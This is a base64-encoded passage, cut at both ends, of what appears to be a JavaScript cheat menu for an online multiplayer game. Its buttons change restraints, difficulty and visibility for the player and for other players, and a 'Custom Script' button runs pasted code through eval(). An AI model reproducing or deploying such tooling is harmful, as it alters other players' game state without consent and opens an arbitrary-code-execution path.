G93LmRvY3VtZW50OwogICAgICBpZnJhbWVEb2N1bWVudC5vcGVuKCk7CiAgICAgIGlmcmFtZURvY3VtZW50LndyaXRlKGh0bWwpOwogICAgICBpZnJhbWVEb2N1bWVudC5jbG9zZSgpOwogICAgfTsKCiAgICAvLyBBcHBlbmQgdGhlIGlmcmFtZSB0byBCQydzIDxib2R5PiBlbGVtZW50CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICAvLyBUaW1lb3V0IHRoZSBmcmFtZQpzZXRUaW1lb3V0KCgpID0+IHsKICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGlmcmFtZSk7Cn0sIDcwMDApOwogIH0pCiAgLmNhdGNoKGVycm9yID0+IHsKICAgIGNvbnNvbGUuZXJyb3IoJ0Vycm9yIGltcG9ydGluZyBIVE1MOicsIGVycm9yKTsKICB9KTsKCgovL0VuZCBPZiBMb2FkaW5nIFNjcmVlbiBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAKZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00vbWFpbi9zZXJ2ZXJtYWludGFpbmFuY2UnKQogIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAudGhlbihkYXRhID0+IHsKICAgIGNvbnN0IHJlZ2V4ID0gL1xkKy87CiAgICBjb25zdCBtYXRjaCA9IGRhdGEubWF0Y2gocmVnZXgpOwogICAgaWYgKG1hdGNoICYmIHBhcnNlSW50KG1hdGNoWzBdKSA+PSAxKSB7CiAgICAgIGZ1bmN0aW9uIHNob3dUb2FzdE1haW50KCkgewogICAgICAgIC8vIFRvYXN0IGNvbnRhaW5lcgogICAgICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgI2YyMmMyYyI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICAgICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgICBzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CiAgICAKICAgIC8vIFVwZGF0ZSB3aWR0aCBvZiB0aGUgc3RhdHVzIGJhciBhcyBpdCBjb3VudHMgZG93bgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgfSwgMCk7CiAgICAgICAgCiAgICAvLyBDcmVhdGUgdGhlIGNsb3NlIGJ1dHRvbgp2YXIgY2xvc2VCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKY2xvc2VCdXR0b24uc3R5bGUuYm9yZGVyID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS50b3AgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUucmlnaHQgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFNpemUgPSAiMTZweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpbkxlZnQgPSAiLTJweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjBweCI7CmNsb3NlQnV0dG9uLmlubmVySFRNTCA9ICJYIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoY2xvc2VCdXR0b24pOwoKLy8gQ2xvc2UgdGhlIHRvYXN0IHdoZW4gdGhlIGNsb3NlIGJ1dHRvbiBpcyBjbGlja2VkCmNsb3NlQnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9LCA1MDApOwp9KTsKCiAgICAvLyBCQ00gTG9nbyBJY29uCiAgICB2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIGljb24uc3R5bGUud2lkdGggPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CiAgICBpY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKICAgIGljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CiAgICAKICAgIC8vIE1haW50ZW5hbmNlIFRleHQKICAgIHZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogICAgdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwogICAgdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwogICAgdGV4dC5pbm5lckhUTUwgPSAiQkNNRSBzZXJ2ZXJzIGFyZSB1bmRlciBtYWludGFpbmFuY2UsIHRyeSBhZ2FpbiBsYXRlciI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKCiAgICAgIAogICAgICAgIC8vIEFwcGVuZCB0aGUgdG9hc3QgY29udGFpbmVyIHRvIEJDJ3MgYm9keQogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogICAgICAKICAgICAgICAvLyBUb2FzdCdzIGZhZGUtaW4gYW5pbWF0aW9uCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgICAgICB9LCAwKTsKICAgICAgCiAgICAgICAgLy8gSGlkZSB0b2FzdCB3aXRoIGEgZmFkZSBvdXQgYW5pbWF0aW9uCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgfSwgNTAwMDAwMCk7CiAgICAgIAogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIH0sIDU1MDAwMDApOwogICAgICB9IAogICAgICBzaG93VG9hc3RNYWludCgpOyAgICAgCiAgICAgIHRocm93IG5ldyBFcnJvcignRXhlY3V0aW9uIHN0b3BwZWQuJyk7IC8vIHN0b3AgZXhlY3V0aW5nIHRoZSByZXN0IG9mIHRoZSBjb2RlCiAgICB9IGVsc2UgewoKCi8vU3RhcnQgT2YgQ29udGV4dCBNZW51X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCi8vRGVza3RvcCBNZW51X19fX19fX19fX19fX19fX19fX19fX18KdmFyIHZpc2IgPSB0cnVlOwovL2NvbnRleHQgTWVudQp2YXIgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7Ci8vIEZ1bmN0aW9uIHRvIGNyZWF0ZSBjdXN0b20gY29udGV4dCBtZW51IGJ1dHRvbnMKZnVuY3Rpb24gY3JlYXRlQnV0dG9uKHRleHQsIG9uQ2xpY2spIHsKICAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogICAgdmFyIGJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgYnV0dG9uLmlubmVySFRNTCA9IHRleHQ7CiAgICBidXR0b24ub25jbGljayA9IG9uQ2xpY2s7CiAgICBidXR0b24uc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBidXR0b24uc3R5bGUudGV4dEFsaWduID0gImxlZnQiOwogICAgYnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgIGJ1dHRvbi5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7CiAgICByZXR1cm4gYnV0dG9uOwp9CgovLyBDcmVhdGUgc2VwYXJhdG9yIGZ1bmN0aW9uCmZ1bmN0aW9uIGNyZWF0ZVNlcGFyYXRvcigpIHsKICAgIHZhciBzZXBhcmF0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJociIpOwogICAgc2VwYXJhdG9yLnN0eWxlLm1hcmdpbiA9ICI1cHggMCI7CiAgICByZXR1cm4gc2VwYXJhdG9yOwp9CgovLyBGdW5jdGlvbiB0byBkaXNwbGF5IGN1c3RvbSBjb250ZXh0IG1lbnVfX19fXwpsZXQgY29udGV4dE1lbnVUaW1lciA9IG51bGw7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNvbnRleHRtZW51IiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoY29udGV4dE1lbnVPcGVuKSB7CiAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgcmV0dXJuOyAvLyBQcmV2ZW50IGR1cGUgbWVudXMKICB9CiAgaWYgKHdpbmRvdy5nZXRTZWxlY3Rpb24oKS50b1N0cmluZygpICE9PSAnJykgewogICAgLy8gQWxsb3cgcmVndWxhciBjb250ZXh0IG1lbnUgd2hlbiB0ZXh0IGlzIGhpZ2hsaWdodGVkCiAgICByZXR1cm47CiAgfQogIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgdmFyIGNvbnRleHRNZW51ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgY29udGV4dE1lbnUuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogIGNvbnRleHRNZW51LnN0eWxlLmJhY2tncm91bmQgPSAibGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgd2hpdGUsIHdoaXRlKSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm94U2hhZG93ID0gIjAgMCAzcHggIzk5OSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjhweCI7CiAgY29udGV4dE1lbnUuc3R5bGUuekluZGV4ID0gIjk5OTkiOwogIGNvbnRleHRNZW51LnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgYmxhY2siOwogIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgaWYgKCdvbnRvdWNoc3RhcnQnIGluIHdpbmRvdykgewogICAgLy8gSGFuZGxlIGxvbmcgcHJlc3Mgb24gbW9iaWxlIGRldmljZXMKICAgIGNvbnRleHRNZW51VGltZXIgPSBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBjb250ZXh0TWVudS5zdHlsZS50b3AgPSBldmVudC50b3VjaGVzWzBdLmNsaWVudFkgKyAicHgiOwogICAgICBjb250ZXh0TWVudS5zdHlsZS5sZWZ0ID0gZXZlbnQudG91Y2hlc1swXS5jbGllbnRYICsgInB4IjsKICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CiAgICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgICB9LCA1MDApOwogIH0gZWxzZSB7CiAgICAvLyBIYW5kbGUgcmlnaHQgY2xpY2sgb24gZGVza3RvcCBkZXZpY2VzCiAgICBjb250ZXh0TWVudS5zdHlsZS50b3AgPSBldmVudC5jbGllbnRZICsgInB4IjsKICAgIGNvbnRleHRNZW51LnN0eWxlLmxlZnQgPSBldmVudC5jbGllbnRYICsgInB4IjsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwogICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICB9CiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGNsZWFyVGltZW91dChjb250ZXh0TWVudVRpbWVyKTsKICB9KTsKICAgIAoKCiAgICAvLyBIZWFkZXIgd2l0aCBCQ00gbG9nbwogICAgdmFyIGhlYWRlciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgaGVhZGVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICBoZWFkZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgaGVhZGVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKCiAgICB2YXIgcHJvZmlsZVBob3RvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBwcm9maWxlUGhvdG8uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUud2lkdGggPSAiMzBweCI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUuaGVpZ2h0ID0gIjMwcHgiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLmJvcmRlclJhZGl1cyA9ICIyMCUiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjEwcHgiOwoKICAgIHZhciBoZWFkZXJUZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBoZWFkZXJUZXh0LmlubmVySFRNTCA9ICI8Yj5Fc3NlbnRpYWxzPC9iPiI7CgogICAgaGVhZGVyLmFwcGVuZENoaWxkKHByb2ZpbGVQaG90byk7CiAgICBoZWFkZXIuYXBwZW5kQ2hpbGQoaGVhZGVyVGV4dCk7CgogLy8gQ3VzdG9tIG1haW4gYnV0dG9ucwogdmFyIGJ1dHRvbjEgPSBjcmVhdGVCdXR0b24oIlJlc3RvcmUgQ2hhcmFjdGVyIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OlBsYXllci5BcHBlYXJhbmNlID0gQ2hhdFNlYXJjaFNhZmV3b3JkQXBwZWFyYW5jZS5zbGljZSgwKTsgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcik7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAKfSk7CnZhciBidXR0b24yID0gY3JlYXRlQnV0dG9uKCJGb3JjZSBSb29tIFN3YXAiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhdFNlbGVjdFN0YXJ0U2VhcmNoKCdYJyksQ2hhdFJvb21TZXRMYXN0Q2hhdFJvb20oJycpLGRvY3VtZW50WydnZXRFbGVtZW50QnlJZCddKCdJbnB1dENoYXQnKVsnc3R5bGUnXVsnZGlzcGxheSddPSdub25lJyxkb2N1bWVudFsnZ2V0RWxlbWVudEJ5SWQnXSgnVGV4dEFyZWFDaGF0TG9nJylbJ3N0eWxlJ11bJ2Rpc3BsYXknXT0nbm9uZScsQ2hhdFNlbGVjdFN0YXJ0U2VhcmNoKCdYJyksQ2hhdFJvb21TZXRMYXN0Q2hhdFJvb20oJycpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjMgPSBjcmVhdGVCdXR0b24oIkZyZWUgVGFyZ2V0IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkNoYXJhY3RlclJlbGVhc2VUb3RhbChDdXJyZW50Q2hhcmFjdGVyKSxDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShDdXJyZW50Q2hhcmFjdGVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b240ID0gY3JlYXRlQnV0dG9uKCJSZW1vdmUgUmVzdHJhaW50IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeVVubG9jayhDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBJbnZlbnRvcnlSZW1vdmUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJJdGVtVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b241ID0gY3JlYXRlQnV0dG9uKCJUYXJnZXQgU3RydWdnbGUgRGlmZmljdWx0eSIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpkb3t2YXIgZGlmYz1wcm9tcHQoJ0RpZmZpY3VsdHlceDIwMS05NicpO313aGlsZSghKGRpZmM+PTB4MSYmZGlmYzw9MHg2MCkpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhlYWQiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Nb3V0aCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoMiIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoMyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFybXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1IYW5kcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUxlZ3MiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1FeWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRmVldCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbURldmljZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1BZGRvbiIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2siLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1OZWNrUmVzdHJhaW50cyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tBY2Nlc3NvcmllcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUJvb3RzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSG9vZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5vc2UiLCBkaWZjKTsKICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjYgPSBjcmVhdGVCdXR0b24oIk9wZW4gVGFyZ2V0IFdhcmRyb2JlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkRpYWxvZ0NoYW5nZUNsb3RoZXMoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b243ID0gY3JlYXRlQnV0dG9uKCJDb21wbGV0ZSBTdHJ1Z2dsZSBNaW5pZ2FtZSIsIGZ1bmN0aW9uKCkgewogICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICBqYXZhc2NyaXB0OlN0cnVnZ2xlUHJvZ3Jlc3MgPTEwMDA7CiAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgICAgRGlhbG9nTGVhdmUoKTsKICAgIH0sIDUwMCk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwoKdmFyIGJ1dHRvbjggPSBjcmVhdGVCdXR0b24oIkludmlzaWJsZSIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgSGVpZ2h0OiAiLSIKICAgICAgfTsKICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcik7IAogICAgICB2aXNiID0gZmFsc2U7CiAgICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICAgdXBkYXRlQ29udGV4dE1lbnUoKTsgCgogICAgCn0pOwoKdmFyIGJ1dHRvbjkgPSBjcmVhdGVCdXR0b24oIlZpc2libGUiLCBmdW5jdGlvbigpIHsKICBqYXZhc2NyaXB0OkNoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB2aXNiID0gdHJ1ZTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIHVwZGF0ZUNvbnRleHRNZW51KCk7IAogIAp9KTsKCnZhciBidXR0b24xMCA9IGNyZWF0ZUJ1dHRvbigiQ3VzdG9tIFNjcmlwdCIsIGZ1bmN0aW9uKCkgewogIGphdmFzY3JpcHQ6dmFyIHNjcnAgPSBwcm9tcHQoIlBhc3RlIHlvdXIgc2NyaXB0IGhlcmU6Iik7CiAgaWYgKHNjcnApIHsKICAgIGV2YWwoc2NycCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgfQp9KTsKLy8gVHJhbnNpdGlvbiBzdHlsaW5nIGZvciB0aGUgYnV0dG9ucwpidXR0b24xLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMi5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjMuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b240LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjYuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b243LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uOC5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjkuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24xMC5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CgoKCi8vSG92ZXIgZXZlbnRzIGZvciB0aGUgYnV0dG9ucwpidXR0b24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewogICAgdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CiAgICB0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKICAgIH0pOwpidXR0b24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CiAgICB0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwogICAgfSk7CgpidXR0b24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24yLmFkZEV2ZW50TG